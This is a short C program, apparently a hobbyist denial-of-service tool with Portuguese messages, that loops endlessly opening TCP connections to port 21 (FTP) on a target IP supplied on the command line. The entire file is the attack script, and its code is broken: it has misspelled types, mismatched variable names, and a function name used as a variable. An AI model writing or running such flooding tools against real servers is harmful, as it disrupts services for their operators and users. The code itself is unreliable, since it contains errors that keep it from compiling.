#include "stdio.h"
#include "sys/socket.h"
#include "netdb.h"

int main(int argc, char *argv[]){

if(argc < 1){

printf("Dos Attack Port 21 - Modo de Uso ./Dos.c IP");
return 0;

}else{

char *ip = argv[1];
int porta = 21;
struct socketaddr_in alvo;
int conexao;
int nerverend;

for(neverend = 0; ; neverend++){ 

socket = socket(AF_INET, SOCK_STREAM, 0);
alvo.sin_family = AF_INET;
alvo.sin_port = htons(porta);
alvo.sin_addr.s_addr = inet_addr(ip);

conexao = connect(socket, (struct sockaddr *)&alvo, sizeof alvo);

if(conexao == 0){

printf("Realizando ataque de Dos");

}

}

}

}
